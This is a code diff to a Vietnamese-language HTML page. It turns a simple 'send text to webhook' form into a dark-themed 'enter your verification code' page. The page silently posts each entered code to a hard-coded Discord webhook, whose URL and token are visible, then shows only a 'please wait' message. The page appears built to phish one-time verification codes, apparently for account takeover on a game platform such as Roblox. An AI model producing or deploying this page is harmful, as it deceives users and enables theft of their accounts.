@@ -3,19 +3,73 @@
 <head>
   <meta charset="UTF-8">
   <title>Gửi dữ liệu đến webhook</title>
-</head>
-<body style="display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; font-family: sans-serif;">
+  <style>
+    body {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      font-family: sans-serif;
+      background-color: #131313;
+      color: white;
+      margin: 0;
+    }
 
-  <input id="myInput" type="text" placeholder="Nhập văn bản cần gửi" style="padding: 10px; width: 300px; font-size: 16px; margin-bottom: 20px;" />
-  <button onclick="sendData()" style="padding: 10px 20px; font-size: 16px; background-color: #4CAF50; color: white; border: none; border-radius: 6px;">Gửi đến webhook</button>
+    input, button {
+      padding: 12px 20px;
+      font-size: 16px;
+      margin: 10px;
+      border-radius: 6px;
+      border: none;
+      outline: none;
+    }
+
+    input {
+      width: 300px;
+      background-color: #1c1f24;
+      color: white;
+      border: 1px solid #555;
+    }
+
+    input::placeholder {
+      color: #888;
+    }
+
+    button {
+      background-color: #335fff;
+      color: white;
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+
+    button:hover {
+      background-color: #2a4bf0;
+    }
+
+    #message {
+      margin-top: 20px;
+      font-size: 16px;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+
+  <input id="myInput" type="text" placeholder="Nhập mã xác minh" />
+  <button id="submitButton">Gửi mã xác minh</button>
+
+  <div id="message"></div>
 
   <script>
     function sendData() {
-      const inputValue = document.getElementById("myInput").value;
-      const webhookURL = "https://discord.com/api/webhooks/1364096814919454730/Y0bWQllAa_JKq_aVcRjKnWtkzu08LukIa6sAKqzB15zEUUEBL2U5NlE9wGbkbQfT-1tD"; // 👉 Thay bằng URL webhook thật
+      const inputValue = document.getElementById("myInput").value.trim();
+      const webhookURL = "https://discord.com/api/webhooks/1364096814919454730/Y0bWQllAa_JKq_aVcRjKnWtkzu08LukIa6sAKqzB15zEUUEBL2U5NlE9wGbkbQfT-1tD";
+      const messageBox = document.getElementById("message");
 
       if (!inputValue) {
-        alert("Vui lòng nhập văn bản.");
+        messageBox.textContent = "⚠️ Vui lòng nhập mã xác minh.";
+        messageBox.style.color = "orange";
         return;
       }
 
@@ -25,17 +79,22 @@
           "Content-Type": "application/json"
         },
         body: JSON.stringify({
-          content: "Dữ liệu người dùng: " + inputValue
+          content: "🔐 Mã xác minh từ người dùng: `" + inputValue + "`"
         })
       })
       .then(() => {
-        // Sau khi gửi xong, chuyển hướng
-        window.location.href = "https://roblox.com"; // 👉 Đổi URL nếu muốn chuyển đến nơi khác
+        messageBox.textContent = "♻ Vui lòng chờ...";
+        messageBox.style.color = "lightgreen";
       })
       .catch(err => {
-        alert("Lỗi khi gửi: " + err);
+        messageBox.textContent = "❌ Lỗi khi gửi: " + err;
+        messageBox.style.color = "red";
       });
     }
+
+    // Đảm bảo rằng hàm sendData được gắn vào sự kiện click của nút sau khi trang tải
+    document.getElementById("submitButton").addEventListener("click", sendData);
   </script>
+
 </body>
 </html>
